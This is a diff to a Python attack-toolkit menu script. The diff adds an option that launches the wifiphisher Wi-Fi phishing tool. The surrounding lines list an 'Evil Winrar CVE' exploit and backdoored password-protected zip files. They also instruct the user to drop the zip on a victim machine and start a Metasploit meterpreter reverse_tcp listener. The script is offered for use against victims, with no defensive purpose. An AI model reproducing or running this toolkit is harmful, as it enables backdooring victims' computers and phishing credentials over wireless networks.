@@ -42,6 +42,7 @@ print("[12] Check Location and info from link (locator)(Working in Russia)")
 print("[13] Evil Winrar CVE")
 print("[14] Make Password Zipped file")
 print("[15] Make Password Zipped file with Meterpreter Backdoor")
+print("[16] Wifiphisher by sophron (Wifi Attack)(Second Network Atack)")
 print('')
 query = input("[*] Choose exploit!:")
 if query in ["1"]:
@@ -201,6 +202,11 @@ if query in ["15"]:
 	print("Drop Zip to Victim Machine and say Password for Zip!")
 	msfMeter = ('msfconsole  -q -x "set payload windows/meterpreter/reverse_tcp; set lhost 0.0.0.0; set LPORT 4444; use multi/handler; exploit"')
 	os.system(msfMeter)
+if query in ["16"]:
+	print("")
+	os.system("wifiphisher")
+
+
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
